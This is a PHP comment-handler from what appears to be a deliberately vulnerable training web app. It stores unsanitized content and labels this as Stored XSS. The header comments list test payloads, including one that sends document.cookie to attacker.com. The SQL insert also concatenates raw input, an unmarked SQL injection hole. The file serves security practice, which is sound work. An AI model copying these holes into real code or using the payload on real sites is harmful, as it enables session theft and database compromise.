<?php
// ============================================
// comment/add.php - Thêm bình luận
// VULNERABILITY: Stored XSS (content lưu vào DB không sanitize)
// TEST: content = <script>alert(document.cookie)</script>
// TEST: content = <img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
// TEST: content = <svg onload=alert(1)>
// ============================================
require_once __DIR__ . '/../config/db.php';
$conn = db_connect();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    redirect('/index.php');
}

$news_id     = intval($_POST['news_id'] ?? 0);
$content     = $_POST['content'] ?? '';
$author_name = $_POST['author_name'] ?? '';

if (!$news_id || !trim($content)) {
    redirect('/news.php?id=' . $news_id . '&error=empty');
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

if (is_logged_in()) {
    $user = current_user();
    $user_id = $user['id'];
    $author_name = $user['username'];
} else {
    $user_id = 'NULL';
    $author_name = $conn->real_escape_string(trim($author_name) ?: 'Khách');
}

// [VULN] Stored XSS: content không được sanitize trước khi lưu
// Content sẽ được render raw trong news.php comments section
$sql = "INSERT INTO comments (news_id, user_id, author_name, content, ip_address, status) 
        VALUES ($news_id, $user_id, '$author_name', '$content', '$ip', 'approved')";

if ($conn->query($sql)) {
    $conn->close();
    redirect('/news.php?id=' . $news_id . '&commented=1#comments');
} else {
    $conn->close();
    redirect('/news.php?id=' . $news_id . '&error=db');
}
